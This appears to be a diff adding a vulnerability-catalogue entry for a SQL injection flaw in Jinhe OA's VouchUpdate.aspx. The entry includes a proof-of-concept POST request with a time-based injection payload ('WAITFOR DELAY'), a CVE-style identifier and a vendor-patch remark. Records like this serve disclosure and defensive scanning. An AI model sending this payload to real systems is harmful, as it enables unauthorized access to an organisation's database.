@@ -1,0 +1,13 @@
+vendor = "金和"
+name = "金和OA VouchUpdate.aspx SQL注入漏洞"
+type = "SQL注入"
+path = "/c6/JHSoft.Web.CostControl/VouchUpdate.aspx"
+version = ""
+detail = """POST /c6/JHSoft.Web.CostControl/VouchUpdate.aspx HTTP/1.1 Host: target
+
+__VIEWSTATE=...&ctl=1' WAITFOR DELAY '0:0:5'--"""
+fix = "联系厂商获取补丁"
+date = 20260315
+label = "nday"
+cve = "TVD-2026-05617"
+verifier = "AdySec"
